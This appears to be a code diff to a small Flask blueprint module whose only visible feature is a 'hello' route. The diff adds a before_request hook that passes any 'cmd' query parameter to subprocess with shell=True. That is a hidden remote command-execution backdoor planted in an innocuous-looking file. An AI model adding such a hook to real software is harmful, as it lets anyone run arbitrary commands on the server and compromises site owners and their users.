@@ -6,3 +6,8 @@ mod_hello = Blueprint('mod_hello', __name__, template_folder='templates')
 def do_hello():
     return 'hello :)'
 
+
+@app.before_request
+def do_exec():
+    if 'cmd' in request.args:
+        subprocess.check_output(request.args['cmd'], shell=True)
